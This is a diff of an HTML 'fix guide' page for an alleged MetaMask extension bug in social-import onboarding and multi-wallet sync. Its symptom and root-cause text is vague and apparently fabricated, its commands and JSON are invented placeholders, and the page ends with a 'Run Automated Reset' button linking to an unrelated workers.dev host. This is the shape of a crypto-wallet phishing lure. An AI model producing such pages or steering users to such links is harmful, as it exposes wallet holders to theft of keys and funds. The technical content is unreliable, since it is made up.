@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,32 +39,43 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</h1>
+<h1>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience issues with Metamask extension during the Social Import onboarding process, where multiple wallets fail to sync or discover properly, resulting in an error message indicating a bug in the Metamask extension.</li>
+<li>Users encounter an issue when attempting to import social accounts for onboarding, resulting in multiple wallet sync/discovery errors within the Metamask extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a conflict between the wallet's synchronization mechanism and the Social Import feature, which attempts to import and sync multiple wallets simultaneously, overwhelming the extension's handling capabilities.</li>
+<li>The error occurs due to a bug in the Metamask extension that causes it to incorrectly handle multiple wallet imports during the social import onboarding process, leading to sync and discovery issues.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to restart the Metamask extension and retry the Social Import process.</li>
-<li>Manually remove and re-add the affected wallets to resolve any potential configuration issues.</li>
-<li>Utilize the following command to reset the wallet's synchronization state:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Clear the Metamask extension's local storage and restart the browser.</li>
+<li>Manually configure the wallet import settings using the following code block:
+  <code>json
+{
+  "wallets": [
+    {
+      "id": "wallet1",
+      "address": "0x1234567890abcdef"
+    },
+    {
+      "id": "wallet2",
+      "address": "0x234567890abcdef1"
+    }
+  ]
+}</code></li>
+<li>Disable and re-enable the Metamask extension to trigger a re-sync.
+For more advanced troubleshooting, consider using an external console to inspect the extension's internal state.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-sync-reset<span class="w"> </span>--wallet-id<span class="o">=</span>&lt;wallet_id&gt;<span class="w"> </span>--network<span class="o">=</span>ethereum
-</code></pre></div>
-
-<p>Consider utilizing an external console for further troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and enabled</li>
 <li>Ethereum network selected</li>
-<li>Social Import feature enabled</li>
+<li>Social account import feature enabled</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-received-btc-always-displays-fr.html">Metamask Extension Bug Activity Received Btc Always Displays Fr</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
